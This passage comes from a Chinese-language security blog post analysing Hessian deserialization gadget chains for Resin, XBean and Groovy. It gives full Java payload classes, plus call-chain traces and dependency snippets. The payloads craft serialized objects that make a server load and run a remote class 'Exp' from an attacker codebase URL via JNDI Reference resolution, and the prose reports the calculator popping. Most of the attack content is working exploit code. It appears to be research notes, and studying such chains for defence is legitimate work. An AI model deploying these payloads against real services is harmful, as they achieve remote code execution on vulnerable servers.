clazz=<span class="string">&quot;Exp&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);  </span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;siJdcpuR&quot;</span>, clazz,codebase));  </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx,<span class="string">&quot;aiwin&quot;</span>,<span class="string">&quot;aiwin1&quot;</span>); <span class="comment">//_items要过for循环  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(qName.hashCode()); <span class="comment">//将哈希值转换回原始数据的算法,放入到Xstring的值中,为了p.hash == hash  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, qName, qName, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, xString, xString, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        String result=Hessian_serialize(hashMap);  </span><br><span class="line">        Hessian_unserialize(result);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span><span class="params">(StringBuilder partial, <span class="type">int</span> target)</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;  </span><br><span class="line">        <span class="keyword">if</span> (div &lt;= <span class="number">65535</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (div != <span class="number">0</span>)  </span><br><span class="line">                partial.append((<span class="type">char</span>)div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            unhash0(partial, div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (target == Integer.MIN_VALUE)  </span><br><span class="line">                <span class="keyword">return</span> answer.toString();  </span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;  </span><br><span class="line">        &#125;  </span><br><span class="line">        unhash0(answer, target);  </span><br><span class="line">        <span class="keyword">return</span> answer.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Hessian_serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);  </span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();  </span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);  </span><br><span class="line">        hessianOutput.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Hessian_unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] code=Base64.getDecoder().decode(obj);  </span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(code);  </span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);  </span><br><span class="line">        hessianInput.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        Field dfield=object.getClass().getDeclaredField(field);  </span><br><span class="line">        dfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dfield.set(object,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/257d1196/IMAGE20250104164259843.png" class=""><p>成功弹出计算器。看到Payload其实会有疑问就是有两个计算hash的地方，这里我是看的其他师傅的blog可以参考他们的解释：</p><p><a href="https://mp.weixin.qq.com/s/Dug5SK1y4WLhYMLdS7ff4g">https://mp.weixin.qq.com/s/Dug5SK1y4WLhYMLdS7ff4g</a><br><a href="https://xz.aliyun.com/t/13599">https://xz.aliyun.com/t/13599</a></p><img src="/post/257d1196/IMAGE20250104165104584.png" class=""><p>这里要想走到这个key.equals就需要满足以下条件</p><ul><li>(p = tab[i = (n - 1) &amp; hash]) == null</li><li>p.hash == hash</li></ul><p>那么为什么可以利用hash碰撞来进行绕过呢，是因为Xstring方法冲写了hashcode方法</p><img src="/post/257d1196/IMAGE20250104165946484.png" class=""><p>这是调用的str方法</p><img src="/post/257d1196/IMAGE20250104170020823.png" class=""><p>就是将m_obj属性转换成字符串类型返回，最后调用String的hashCode方法进行hash计算，这里的m_obj即是实例化XString传入的参数。所以我们可以根据Qname的hashcode来构造Xstring的hashcode也就可以触发整条调用链</p><h2 id="XBean链">XBean链</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loadClass:<span class="number">61</span>, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">146</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">resolve:<span class="number">73</span>, ContextUtil (org.apache.xbean.naming.context)</span><br><span class="line">getObject:<span class="number">204</span>, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">toString:<span class="number">192</span>, Binding (javax.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">104</span>, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">main:<span class="number">34</span>, Hessian_XBean (com.ocean)</span><br></pre></td></tr></table></figure><h3 id="调用链分析-2">调用链分析</h3><p>XBean 这条链几乎是与 Resin 一模一样，只不过是在 XBean 中找到了类似功能的实现。<br>这里首先还是会从Xstring这里触发toString方法不过这次走的Binding类的toString方法</p><img src="/post/257d1196/IMAGE20250104183559048.png" class=""><p>这里只有一个getObject方法，而在ContextUtil$ReadOnlyBinding类里存在getObject方法，并且也是Binding的子类，所以调用ReadOnlyBinding的toString会执行到ReadOnlyBinding的getObject方法。</p><img src="/post/257d1196/IMAGE20250104183742050.png" class=""><p>这里会调用ContextUtil#resolve方法跟进</p><img src="/post/257d1196/IMAGE20250104183818375.png" class=""><p>可以看到这里存在NamingManager.getObjectInstance方法那么剩下的就和上面Resign一样了。从远程加载恶意类执行。</p><p>给出Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Resin</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;  </span><br><span class="line">        String codebase=<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;  </span><br><span class="line">        String clazz=<span class="string">&quot;Exp&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);  </span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>, clazz,codebase));  </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx,<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;ocean&quot;</span>); <span class="comment">//_items要过for循环  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(qName.hashCode()); <span class="comment">//将哈希值转换回原始数据的算法,放入到Xstring的值中,为了p.hash == hash  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, qName, qName, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, xString, xString, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        String result=Hessian_serialize(hashMap);  </span><br><span class="line">        Hessian_unserialize(result);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span><span class="params">(StringBuilder partial, <span class="type">int</span> target)</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;  </span><br><span class="line">        <span class="keyword">if</span> (div &lt;= <span class="number">65535</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (div != <span class="number">0</span>)  </span><br><span class="line">                partial.append((<span class="type">char</span>)div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            unhash0(partial, div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (target == Integer.MIN_VALUE)  </span><br><span class="line">                <span class="keyword">return</span> answer.toString();  </span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;  </span><br><span class="line">        &#125;  </span><br><span class="line">        unhash0(answer, target);  </span><br><span class="line">        <span class="keyword">return</span> answer.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Hessian_serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);  </span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();  </span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);  </span><br><span class="line">        hessianOutput.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Hessian_unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] code=Base64.getDecoder().decode(obj);  </span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(code);  </span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);  </span><br><span class="line">        hessianInput.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        Field dfield=object.getClass().getDeclaredField(field);  </span><br><span class="line">        dfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dfield.set(object,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/257d1196/IMAGE20250104184419709.png" class=""><p>成功弹出计算器，但是可以看到Payload中出现了一个HotSwappableTargetSource方法这是为什么呢？其实是为了绕过前面的hash那里的判断具体是因为什么可以参考：<br><a href="https://mp.weixin.qq.com/s/dbT8_O3o9BbCKcg-ecGMgg">https://mp.weixin.qq.com/s/dbT8_O3o9BbCKcg-ecGMgg</a><br>我自己的理解是因为这个类他存在equals方法</p><img src="/post/257d1196/IMAGE20250104191416009.png" class=""><p>并且这里的target是可控的</p><img src="/post/257d1196/IMAGE20250104191446748.png" class=""><h2 id="Groovy链">Groovy链</h2><p>环境依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="调用链分析-3">调用链分析</h3><p>这条链子的关键点在MethodClosure这个类中的docall方法</p><img src="/post/257d1196/IMAGE20250104193248159.png" class=""><p>再来看看他的构造方法</p><img src="/post/257d1196/IMAGE20250104193329595.png" class=""><p>可以看到接收两个参数一个object任意对象一个字符串方法，在结合上面的doCall方法这里很容易能看出来就是可以调用任意对象的任意方法</p><img src="/post/257d1196/IMAGE20250104193522153.png" class=""><p>并且参数也是可控的。那这里就去需要找一下谁会调用doCall方法并且是可控的找到Closure类的call方法调用doCall方法</p><img src="/post/257d1196/IMAGE20250104193914317.png" class=""><p>这里是通过反射调用的，再去找一下谁调用了call方法，找到了ConvertedClosure类里面的invokeCustom方法</p><img src="/post/257d1196/IMAGE20250104194048298.png" class=""><p>并且这里的getDelegate是可控的师傅直接看ConversionHandler类的构造方法我就不贴图了，那这个invokeCustom方法又是在哪里被调用的呢？</p><img src="/post/257d1196/IMAGE20250104194501959.png" class=""><p>在它的父类里的invoke方法中会调用这里，所以现在需要找一个动态代理的形式来进行触发并且调用Resin链的后半段ContinuationDirContext类中的getTargetContext方法完成链子的触发。<br>所以现在需要找到一个可以触发前半段链的入口，这里只能用TreeMap类原因参考<br><a href="https://mp.weixin.qq.com/s/daciyp4xHqbEy9drMnKizg">https://mp.weixin.qq.com/s/daciyp4xHqbEy9drMnKizg</a><br><a href="https://xz.aliyun.com/t/13345?time__1311=GqmxuiDQ5Cq0HRx%2BhODcDRxvbSh27bD#toc-7">https://xz.aliyun.com/t/13345?time__1311=GqmxuiDQ5Cq0HRx%2BhODcDRxvbSh27bD#toc-7</a></p><p>记录下Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;  </span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Groovy</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">    cpe.setResolvedObj(reference);  </span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>);  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class,Hashtable.class);  </span><br><span class="line">    declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">c1</span> <span class="operator">=</span> declaredConstructor.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">  </span><br><span class="line">    <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(c1,<span class="string">&quot;listBindings&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">ConvertedClosure</span> <span class="variable">convertedClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;compareTo&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparable.class&#125;, convertedClosure);  